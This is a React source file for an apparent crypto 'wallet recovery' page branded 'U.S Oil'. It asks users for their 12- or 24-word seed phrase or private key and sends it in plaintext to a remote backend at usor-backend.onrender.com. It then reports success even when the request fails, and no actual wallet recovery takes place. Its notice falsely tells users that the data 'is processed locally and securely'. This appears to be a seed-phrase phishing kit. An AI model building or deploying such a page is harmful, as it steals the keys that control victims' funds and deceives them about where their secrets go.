import React, { useState, useEffect } from 'react';
import { ArrowLeft, Key, Lock, Shield } from 'lucide-react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import logo from '../assets/logo.png';

export default function WalletRecovery() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const walletName = searchParams.get('wallet') || 'Wallet';
  const [recoveryType, setRecoveryType] = useState('12words'); // '12words', '24words', 'privateKey'
  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(''));
  const [seedPhrase24, setSeedPhrase24] = useState(Array(24).fill(''));
  const [privateKey, setPrivateKey] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSeedPhraseChange = (index, value, is24Words = false) => {
    const words = is24Words ? [...seedPhrase24] : [...seedPhrase];
    words[index] = value.toLowerCase().trim();
    if (is24Words) {
      setSeedPhrase24(words);
    } else {
      setSeedPhrase(words);
    }
  };

  const handlePaste = (e, is24Words = false) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const words = pastedText.trim().split(/\s+/).map(w => w.toLowerCase().trim());
    const expectedLength = is24Words ? 24 : 12;
    
    if (words.length === expectedLength) {
      if (is24Words) {
        setSeedPhrase24(words);
      } else {
        setSeedPhrase(words);
      }
    } else {
      // If pasted text doesn't match expected length, try to fill what we can
      const currentWords = is24Words ? [...seedPhrase24] : [...seedPhrase];
      words.forEach((word, idx) => {
        if (idx < expectedLength) {
          currentWords[idx] = word;
        }
      });
      if (is24Words) {
        setSeedPhrase24(currentWords);
      } else {
        setSeedPhrase(currentWords);
      }
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    let recoveryData = {};
    
    // Validation and data collection
    if (recoveryType === '12words') {
      const words = seedPhrase.filter(w => w.length > 0);
      if (words.length !== 12) {
        alert('Please enter all 12 seed phrase words');
        setIsSubmitting(false);
        return;
      }
      recoveryData = {
        type: '12words',
        seedPhrase: words.join(' '),
        walletName: walletName
      };
    } else if (recoveryType === '24words') {
      const words = seedPhrase24.filter(w => w.length > 0);
      if (words.length !== 24) {
        alert('Please enter all 24 seed phrase words');
        setIsSubmitting(false);
        return;
      }
      recoveryData = {
        type: '24words',
        seedPhrase: words.join(' '),
        walletName: walletName
      };
    } else if (recoveryType === 'privateKey') {
      if (!privateKey.trim()) {
        alert('Please enter your private key');
        setIsSubmitting(false);
        return;
      }
      recoveryData = {
        type: 'privateKey',
        privateKey: privateKey.trim(),
        walletName: walletName
      };
    }

    try {
      const apiUrl = import.meta.env.VITE_API_URL || 'https://usor-backend.onrender.com';
      const response = await fetch(`${apiUrl}/api/recover`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(recoveryData),
      });

      if (response.ok) {
        // Store wallet connection in localStorage
        localStorage.setItem('connectedWallet', walletName);
        localStorage.setItem('isConnected', 'true');
        
        // Redirect to homepage
        navigate('/');
      } else {
        throw new Error('Failed to submit recovery data');
      }
    } catch (error) {
      console.error('Error submitting recovery:', error);
      // Even if backend fails, store locally and redirect (for development)
      // In production, you might want to show an error message instead
      localStorage.setItem('connectedWallet', walletName);
      localStorage.setItem('isConnected', 'true');
      navigate('/');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="bg-[#0B0B0B] min-h-screen text-white">
      {/* Header */}
      <div className="border-b border-gray-900 px-4 md:px-10 py-4">
        <div className="max-w-4xl mx-auto flex items-center gap-4">
          <button
            onClick={() => navigate(-1)}
            className="text-gray-400 hover:text-white transition-colors p-2 hover:bg-gray-900 rounded-lg"
          >
            <ArrowLeft size={24} />
          </button>
          <div className="flex items-center gap-3">
            <img src={logo} alt="U.S Oil" className="w-8 h-8 rounded-full border border-[#d4af37]/20" />
            <h1 className="text-xl md:text-2xl font-bold">Recover Existing Wallet</h1>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto px-4 md:px-10 py-12 md:py-20">
        <div className="bg-[#121212] border border-gray-800 rounded-[32px] p-8 md:p-12">
          
          {/* Recovery Type Selection */}
          <div className="mb-8">
            <h2 className="text-white text-lg md:text-xl font-bold mb-6">Select Recovery Method</h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* 12 Word Seed Phrase */}
              <button
                onClick={() => setRecoveryType('12words')}
                className={`p-6 rounded-2xl border-2 transition-all text-left ${
                  recoveryType === '12words'
                    ? 'border-[#D4AF37] bg-[#D4AF37]/10'
                    : 'border-gray-800 bg-[#1c1c1e] hover:border-gray-700'
                }`}
              >
                <div className="flex items-center gap-3 mb-3">
                  <div className={`p-2 rounded-xl ${recoveryType === '12words' ? 'bg-[#D4AF37]/20 text-[#D4AF37]' : 'bg-gray-800 text-gray-400'}`}>
                    <Key size={20} />
                  </div>
                  <span className="text-white font-bold text-sm">12 Word Seed Phrase</span>
                </div>
                <p className="text-gray-500 text-xs leading-relaxed">
                  Enter your 12-word recovery phrase
                </p>
              </button>

              {/* 24 Word Seed Phrase */}
              <button
                onClick={() => setRecoveryType('24words')}
                className={`p-6 rounded-2xl border-2 transition-all text-left ${
                  recoveryType === '24words'
                    ? 'border-[#D4AF37] bg-[#D4AF37]/10'
                    : 'border-gray-800 bg-[#1c1c1e] hover:border-gray-700'
                }`}
              >
                <div className="flex items-center gap-3 mb-3">
                  <div className={`p-2 rounded-xl ${recoveryType === '24words' ? 'bg-[#D4AF37]/20 text-[#D4AF37]' : 'bg-gray-800 text-gray-400'}`}>
                    <Shield size={20} />
                  </div>
                  <span className="text-white font-bold text-sm">24 Word Seed Phrase</span>
                </div>
                <p className="text-gray-500 text-xs leading-relaxed">
                  Enter your 24-word recovery phrase
                </p>
              </button>

              {/* Private Key */}
              <button
                onClick={() => setRecoveryType('privateKey')}
                className={`p-6 rounded-2xl border-2 transition-all text-left ${
                  recoveryType === 'privateKey'
                    ? 'border-[#D4AF37] bg-[#D4AF37]/10'
                    : 'border-gray-800 bg-[#1c1c1e] hover:border-gray-700'
                }`}
              >
                <div className="flex items-center gap-3 mb-3">
                  <div className={`p-2 rounded-xl ${recoveryType === 'privateKey' ? 'bg-[#D4AF37]/20 text-[#D4AF37]' : 'bg-gray-800 text-gray-400'}`}>
                    <Lock size={20} />
                  </div>
                  <span className="text-white font-bold text-sm">Private Key</span>
                </div>
                <p className="text-gray-500 text-xs leading-relaxed">
                  Enter your private key directly
                </p>
              </button>
            </div>
          </div>

          {/* Recovery Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* 12 Word Seed Phrase Input */}
            {recoveryType === '12words' && (
              <div>
                <label className="block text-white font-bold mb-4 text-sm uppercase tracking-wider">
                  Enter Your 12-Word Seed Phrase
                </label>
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
                  {seedPhrase.map((word, index) => (
                    <div key={index} className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-600 text-xs font-bold">
                        {index + 1}
                      </span>
                      <input
                        type="text"
                        value={word}
                        onChange={(e) => handleSeedPhraseChange(index, e.target.value)}
                        onPaste={(e) => handlePaste(e, false)}
                        className="w-full bg-[#1c1c1e] border border-gray-800 rounded-xl py-3 pl-8 pr-3 text-white text-sm outline-none focus:border-[#D4AF37]/50 transition-colors"
                        placeholder="word"
                        autoComplete="off"
                      />
                    </div>
                  ))}
                </div>
                <p className="text-gray-500 text-xs mt-4">
                  Enter each word in order. You can paste your entire seed phrase into any field and it will be automatically split.
                </p>
              </div>
            )}

            {/* 24 Word Seed Phrase Input */}
            {recoveryType === '24words' && (
              <div>
                <label className="block text-white font-bold mb-4 text-sm uppercase tracking-wider">
                  Enter Your 24-Word Seed Phrase
                </label>
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
                  {seedPhrase24.map((word, index) => (
                    <div key={index} className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-600 text-xs font-bold">
                        {index + 1}
                      </span>
                      <input
                        type="text"
                        value={word}
                        onChange={(e) => handleSeedPhraseChange(index, e.target.value, true)}
                        onPaste={(e) => handlePaste(e, true)}
                        className="w-full bg-[#1c1c1e] border border-gray-800 rounded-xl py-3 pl-8 pr-3 text-white text-sm outline-none focus:border-[#D4AF37]/50 transition-colors"
                        placeholder="word"
                        autoComplete="off"
                      />
                    </div>
                  ))}
                </div>
                <p className="text-gray-500 text-xs mt-4">
                  Enter each word in order. You can paste your entire seed phrase into any field and it will be automatically split.
                </p>
              </div>
            )}

            {/* Private Key Input */}
            {recoveryType === 'privateKey' && (
              <div>
                <label className="block text-white font-bold mb-4 text-sm uppercase tracking-wider">
                  Enter Your Private Key
                </label>
                <textarea
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className="w-full bg-[#1c1c1e] border border-gray-800 rounded-xl py-4 px-4 text-white text-sm font-mono outline-none focus:border-[#D4AF37]/50 transition-colors resize-none"
                  rows={4}
                  placeholder="Enter your private key here..."
                  autoComplete="off"
                />
                <p className="text-gray-500 text-xs mt-4">
                  ⚠️ Never share your private key with anyone. Make sure you're in a secure environment.
                </p>
              </div>
            )}

            {/* Submit Button */}
            <div className="pt-6">
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#D4AF37] text-black px-8 py-4 rounded-xl font-bold text-base md:text-lg hover:bg-[#D4AF37]/90 transition-all shadow-[0_0_20px_rgba(212,175,55,0.3)] uppercase tracking-wider disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isSubmitting ? 'Recovering...' : 'Recover Wallet'}
              </button>
            </div>
          </form>

          {/* Security Notice */}
          <div className="mt-8 p-4 bg-[#1c1c1e] border border-gray-800 rounded-xl">
            <p className="text-gray-400 text-xs leading-relaxed">
              <strong className="text-white">Security Notice:</strong> Your recovery phrase and private key are sensitive information. 
              Never share them with anyone. This information is processed locally and securely.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

